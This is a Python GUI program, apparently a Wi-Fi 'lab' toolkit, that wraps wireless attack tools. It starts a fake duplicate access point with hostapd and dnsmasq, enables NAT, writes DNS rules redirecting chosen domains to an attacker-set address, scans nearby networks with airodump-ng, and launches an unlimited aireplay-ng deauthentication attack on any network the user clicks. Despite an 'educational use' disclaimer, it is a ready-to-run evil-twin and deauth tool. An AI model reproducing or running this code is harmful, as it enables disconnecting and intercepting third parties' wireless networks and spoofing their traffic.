import tkinter as tk
from tkinter import ttk, messagebox
import subprocess
import os
import threading
import csv
import time

class WifiLabGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("WiFi Lab Controller")
        self.root.geometry("800x600")
        self.tabs = ttk.Notebook(root)
        self.tabs.pack(expand=True, fill="both")
        # Tabs
        self.home_tab = ttk.Frame(self.tabs)
        self.network_tab = ttk.Frame(self.tabs)
        self.domain_tab = ttk.Frame(self.tabs)
        self.about_tab = ttk.Frame(self.tabs)
        self.scan_tab = ttk.Frame(self.tabs)
        self.tabs.add(self.home_tab, text="Home")
        self.tabs.add(self.network_tab, text="Network")
        self.tabs.add(self.domain_tab, text="Domain")
        self.tabs.add(self.scan_tab, text="Scan Networks (Mode 3 & 4)")
        self.tabs.add(self.about_tab, text="About")
        self.build_home()
        self.build_network()
        self.build_domain()
        self.build_about()
        self.build_scan_tab()
        self.selected_network = None
    # -----------------------------------------------------
    # HOME TAB
    # -----------------------------------------------------
    def build_home(self):
        ttk.Label(self.home_tab, text="Wi-Fi Lab Modes", font=("Arial", 16)).pack(pady=15)
        # MODE SELECTION
        self.mode_var = tk.StringVar()
        ttk.Label(self.home_tab, text="Choose Mode:").pack()
        ttk.Radiobutton(self.home_tab, text="Mode 1: Safe Disconnect + Fake AP",
                        variable=self.mode_var, value="mode1").pack()
        ttk.Radiobutton(self.home_tab, text="Mode 2: Fake AP Only",
                        variable=self.mode_var, value="mode2").pack()
        # BUTTONS
        ttk.Button(self.home_tab, text="Safe Disconnect (Restart Wi-Fi)",
                   command=self.safe_disconnect).pack(pady=10)
        ttk.Button(self.home_tab, text="Start Duplicate AP",
                   command=self.start_fake_ap).pack(pady=10)
        ttk.Button(self.home_tab, text="Stop Fake AP",
                   command=self.stop_fake_ap).pack(pady=10)
        ttk.Button(self.home_tab, text="End Attack / Restore Normal",
           command=self.restore_normal).pack(pady=10)
    # -----------------------------------------------------
    # SAFE DISCONNECT FUNCTION
    # -----------------------------------------------------
    def safe_disconnect(self):
        try:
            subprocess.call(["sudo", "ip", "link", "set", "wlan0", "down"])
            subprocess.call(["sleep", "2"])
            subprocess.call(["sudo", "ip", "link", "set", "wlan0", "up"])

            messagebox.showinfo("Done", "Safe disconnect complete.")
        except Exception as e:
            messagebox.showerror("Error", str(e))
    # -----------------------------------------------------
    # FAKE AP CONTROL
    # -----------------------------------------------------
    def start_fake_ap(self):
        try:
            subprocess.call(["sudo", "systemctl", "start", "hostapd"])
            subprocess.call(["sudo", "systemctl", "start", "dnsmasq"])
            messagebox.showinfo("AP Running", "Fake AP started successfully.")
        except Exception as e:
            messagebox.showerror("Error", str(e))
    def stop_fake_ap(self):
        try:
            subprocess.call(["sudo", "systemctl", "stop", "hostapd"])
            subprocess.call(["sudo", "systemctl", "stop", "dnsmasq"])
            messagebox.showinfo("Stopped", "Fake AP stopped.")
        except Exception as e:
            messagebox.showerror("Error", str(e))
    # -----------------------------------------------------
    # NETWORK TAB
    # -----------------------------------------------------
    def build_network(self):
        ttk.Label(self.network_tab, text="Network Tools", font=("Arial", 16)).pack(pady=15)

        ttk.Button(self.network_tab, text="Show Network Interfaces",
                   command=self.show_interfaces).pack(pady=10)

        ttk.Button(self.network_tab, text="Enable NAT Routing",
                   command=self.enable_nat).pack(pady=10)

    def show_interfaces(self):
        output = subprocess.getoutput("ip a")
        messagebox.showinfo("Interfaces", output)

    def enable_nat(self):
        subprocess.call(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"])
        messagebox.showinfo("NAT", "NAT routing enabled.")
    # -----------------------------------------------------
    # DOMAIN REDIRECTION TAB
    # -----------------------------------------------------
    def build_domain(self):
        ttk.Label(self.domain_tab, text="Domain Redirection (dnsmasq)", font=("Arial", 16)).pack(pady=15)
        domain_frame = ttk.Frame(self.domain_tab)
        domain_frame.pack(pady=10)
        ttk.Label(domain_frame, text="Domain:").grid(row=0, column=0)
        self.domain_entry = ttk.Entry(domain_frame, width=20)
        self.domain_entry.grid(row=0, column=1)
        ttk.Label(domain_frame, text="Redirect To (IP:Port):").grid(row=1, column=0)
        self.redirect_entry = ttk.Entry(domain_frame, width=20)
        self.redirect_entry.grid(row=1, column=1)
        ttk.Button(self.domain_tab, text="Add Redirect Rule",
                   command=self.add_dns_rule).pack(pady=10)

    def add_dns_rule(self):
        domain = self.domain_entry.get()
        redirect_to = self.redirect_entry.get()
        with open("/etc/dnsmasq.conf", "a") as f:
            f.write(f"address=/{domain}/{redirect_to}\n")
        subprocess.call(["sudo", "systemctl", "restart", "dnsmasq"])
        messagebox.showinfo("Done", f"Redirected {domain} → {redirect_to}")
    # -----------------------------------------------------
    # ABOUT TAB
    # -----------------------------------------------------
    def build_about(self):
        about_frame = ttk.Frame(self.about_tab)
        about_frame.pack(pady=20)
        # Title
        ttk.Label(
            about_frame,
            text="Wi-Fi Lab Controller",
            font=("Arial", 22, "bold")
        ).pack(pady=10)
        # Description
        ttk.Label(
            about_frame,
            text=(
                "A local Wi-Fi analysis and learning toolkit.\n"
                "Designed for educational use on your own equipment.\n"
                "No attack or harmful things must be done these features\nare only demonstrate attack in lab enviroment."
            ),
            font=("Arial", 12),
            justify="center"
        ).pack(pady=10)
        ttk.Separator(about_frame, orient="horizontal").pack(fill="x", pady=10)
        # Author section
        ttk.Label(
            about_frame,
            text="Developed By:",
            font=("Arial", 14, "bold")
        ).pack(pady=5)
        ttk.Label(
            about_frame,
            text="Mohammed Zahid Wadiwale",
            font=("Arial", 12)
        ).pack(pady=2)
        ttk.Separator(about_frame, orient="horizontal").pack(fill="x", pady=10)
        # Links section
        ttk.Label(
            about_frame,
            text="Official Links",
            font=("Arial", 14, "bold")
        ).pack(pady=5)
        link_style = {"font": ("Arial", 11), "foreground": "blue", "cursor": "hand2"}
        def make_link(label, url):
            widget = tk.Label(about_frame, text=label, **link_style)
            widget.pack()
            widget.bind("<Button-1>", lambda e: subprocess.Popen(["xdg-open", url]))
        make_link("Website: www.webaon.com", "https://www.webaon.com/")
        make_link("GitHub: github.com/ZahidServers", "https://github.com/ZahidServers")
        make_link("Blog: blog.webaon.com", "https://blog.webaon.com/")
        make_link("Academy: academy.webaon.com", "https://academy.webaon.com/")
        ttk.Separator(about_frame, orient="horizontal").pack(fill="x", pady=10)
        # Support section
        ttk.Label(
            about_frame,
            text="Support My Work",
            font=("Arial", 14, "bold")
        ).pack(pady=5)

        ttk.Label(
            about_frame,
            text=(
                "You can support development by:\n"
                "• Buying Web Hosting, Domains or Website Services from Webaon\n"
                "• Reading articles at Webaon Blog\n"
                "• Purchasing Courses on Webaon Academy"
            ),
            font=("Arial", 11),
            justify="center"
        ).pack(pady=5)
        ttk.Separator(about_frame, orient="horizontal").pack(fill="x", pady=12)
        ttk.Label(
            about_frame,
            text="© 2025 Webaon — All Rights Reserved",
            font=("Arial", 10),
            foreground="#666"
        ).pack(pady=5)
    # -----------------------------------------------------
    # Exit COde
    # -----------------------------------------------------
    def restore_normal(self):
        try:
            # Stop fake AP
            subprocess.call(["sudo", "systemctl", "stop", "hostapd"])
            subprocess.call(["sudo", "systemctl", "stop", "dnsmasq"])
            # Restore dnsmasq to default
            with open("/etc/dnsmasq.conf", "w") as f:
                f.write("")  # Clear all redirect rules
            subprocess.call(["sudo", "systemctl", "restart", "dnsmasq"])
            # Flush NAT rules added by the app
            subprocess.call(["sudo", "iptables", "-t", "nat", "-F"])
            subprocess.call(["sudo", "iptables", "-F"])
            # Restart Wi-Fi interface
            subprocess.call(["sudo", "ip", "link", "set", "wlan0", "down"])
            subprocess.call(["sleep", "2"])
            subprocess.call(["sudo", "ip", "link", "set", "wlan0", "up"])
            # Restart NetworkManager (only if installed)
            subprocess.call(["sudo", "systemctl", "restart", "NetworkManager"], stderr=subprocess.DEVNULL)
            messagebox.showinfo("Restored", "Everything is back to normal!")
        except Exception as e:
            messagebox.showerror("Error", str(e))
    def build_scan_tab(self):
        ttk.Label(self.scan_tab, text="WiFi Scanner (Mode 3 & 4)", font=("Arial", 16)).pack(pady=10)
        frame_top = ttk.Frame(self.scan_tab)
        frame_top.pack(pady=5)
        # Interface selection
        ttk.Label(frame_top, text="Interface:").grid(row=0, column=0, padx=5)
        self.interface_var = tk.StringVar()
        interfaces = subprocess.getoutput("iwconfig | grep IEEE | awk '{print $1}'").splitlines()
        self.interface_dropdown = ttk.Combobox(frame_top, textvariable=self.interface_var, values=interfaces, width=10)
        self.interface_dropdown.grid(row=0, column=1, padx=5)
        # Buttons
        ttk.Button(frame_top, text="Mode 3: Scan 2.4 GHz", command=self.scan_24ghz).grid(row=1, column=0, pady=5)
        ttk.Button(frame_top, text="Mode 4: Scan 5 GHz", command=self.scan_5ghz).grid(row=1, column=1, pady=5)
        ttk.Button(frame_top, text="Stop Scan", command=self.stop_scan).grid(row=1, column=2, pady=5)
        # TABLE
        self.tree = ttk.Treeview(self.scan_tab, columns=("bssid", "channel", "band", "essid"), show="headings")
        self.tree.heading("bssid", text="BSSID")
        self.tree.heading("channel", text="Channel")
        self.tree.heading("band", text="Band")
        self.tree.heading("essid", text="ESSID")
        self.tree.pack(fill="both", expand=True, pady=10)
        self.tree.bind("<<TreeviewSelect>>", self.on_network_select)
        self.airodump_process = None
        self.stop_flag = False
    def start_monitor_mode(self, interface):
        subprocess.call(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        subprocess.call(["sudo", "airmon-ng", "start", interface], stdout=subprocess.DEVNULL)
        return interface + "mon"
    def stop_monitor_mode(self, interface):
        subprocess.call(["sudo", "airmon-ng", "stop", interface], stdout=subprocess.DEVNULL)
        subprocess.call(["sudo", "systemctl", "restart", "NetworkManager"], stderr=subprocess.DEVNULL)
    def auto_stop_after_timeout(self, timeout=10):
        time.sleep(timeout)
        if not self.stop_flag:
            self.stop_scan()
    def parse_airodump_csv(self, filename, band):
        if not os.path.exists(filename):
            return []
        networks = []
        try:
            with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                reader = csv.reader(f)
                for row in reader:
                    if len(row) > 13 and row[0] != "BSSID":
                        bssid = row[0].strip()
                        channel = row[3].strip()
                        essid = row[13].strip()
                        if essid != "":
                            networks.append((bssid, channel, band, essid))
        except:
            pass
        return networks
    def on_network_select(self, event):
        selected = self.tree.selection()
        if not selected:
            return
        values = self.tree.item(selected[0], "values")
        if len(values) < 4:
            return
        bssid = values[0]
        channel = values[1]
        band = values[2]
        essid = values[3]
        interface = self.interface_var.get()
        self.selected_network = {
            "interface": interface,
            "bssid": bssid,
            "channel": channel,
            "band": band,
            "essid": essid
        }
        confirm = messagebox.askokcancel(
            "Confirm Network Selection",
            f"Do you want to select this network?\n\n"
            f"Interface: {interface}\n"
            f"BSSID: {bssid}\n"
            f"Channel: {channel}\n"
            f"Band: {band}\n"
            f"ESSID: {essid}"
        )
        if confirm:
            self.deauth_attack(interface, bssid, channel)
        else:
            print("User cancelled network selection.")
    def update_table(self, networks):
        for row in self.tree.get_children():
            self.tree.delete(row)
        for n in networks:
            self.tree.insert("", "end", values=n)
    def run_scan(self, band):
        interface = self.interface_var.get()
        if interface == "":
            messagebox.showerror("Error", "Select an interface first.")
            return
        self.stop_flag = False
        # enable monitor mode
        mon = self.start_monitor_mode(interface)
        # remove old files
        for f in os.listdir():
            if f.startswith("scan"):
                os.remove(f)
        # choose band
        if band == "2.4":
            args = ["airodump-ng", "--band", "bg", "--output-format", "csv", "-w", "scan", mon]
        else:
            args = ["airodump-ng", "--band", "a", "--output-format", "csv", "-w", "scan", mon]
        # start scanning
        self.airodump_process = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # auto-stop thread
        threading.Thread(target=self.auto_stop_after_timeout, daemon=True).start()
        # live update
        def update_loop():
            while not self.stop_flag:
                time.sleep(2)
                networks = self.parse_airodump_csv("scan-01.csv", band)
                self.update_table(networks)
        threading.Thread(target=update_loop, daemon=True).start()
    def scan_24ghz(self):
        self.run_scan("2.4")
    def scan_5ghz(self):
        self.run_scan("5")
    def stop_scan(self):
        self.stop_flag = True
        try:
            if self.airodump_process:
                self.airodump_process.terminate()
            # stop monitor mode
            subprocess.call(["sudo", "airmon-ng", "stop", "wlan0mon"], stdout=subprocess.DEVNULL)
        except:
            pass
        # clear table
        for row in self.tree.get_children():
            self.tree.delete(row)
        messagebox.showinfo("Stopped", "Scan stopped and monitor mode disabled.")
    def deauth_attack(self, interface, bssid, channel):
        """Perform a deauthentication attack on the selected network."""
        messagebox.showinfo(f"Setting interface to channel {channel}...")
        subprocess.run(["iwconfig", interface, "channel", channel])
        messagebox.showinfo(f"Starting deauth attack on BSSID {bssid}...")
        try:
            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
        except KeyboardInterrupt:
            messagebox.showinfo("\nDeauth attack stopped.")

# ---------------------------------------------------------
# RUN THE APP
# ---------------------------------------------------------
def main():
    root = tk.Tk()
    app = WifiLabGUI(root)
    root.mainloop()
if __name__ == "__main__":
    main()
